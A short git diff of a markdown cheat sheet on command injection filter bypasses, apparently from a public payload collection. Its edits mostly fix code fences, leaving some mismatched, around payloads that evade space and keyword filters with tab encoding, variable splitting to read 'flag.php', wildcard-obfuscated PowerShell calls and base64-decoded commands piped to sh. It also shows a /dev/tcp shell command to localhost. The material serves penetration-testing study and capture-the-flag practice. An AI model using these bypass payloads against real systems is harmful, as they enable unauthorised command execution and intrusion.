@@ -91,6 +91,8 @@ swissky@crashlab▸ ~ ▸ $ X=$'uname\x20-a'&&$X
 Linux crashlab 4.4.X-XX-generic #72-Ubuntu
 
 swissky@crashlab▸ ~ ▸ $ sh</dev/tcp/127.0.0.1/4242
+
+%09 bypass space
 ```
 
 Commands execution without spaces, $ or { } - Linux (Bash only)
@@ -160,13 +162,14 @@ powershell C:\*\*2\n??e*d.*? # notepad
 @^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
 ```
 ### Bypass with =
-a=fl;b=ag.php;cat $a$b      
+```a=fl;b=ag.php;cat $a$b      
 a=l;b=s;$a$b
+```
 
 #### Bypass with base64
-\`echo d2hvYW1p|base64 -d\` 
-
+````echo d2hvYW1p|base64 -d` 
 echo Y2F0IGluZGV4LnBocAo=|base64 -d|sh
+```
 
 
 ## Challenge
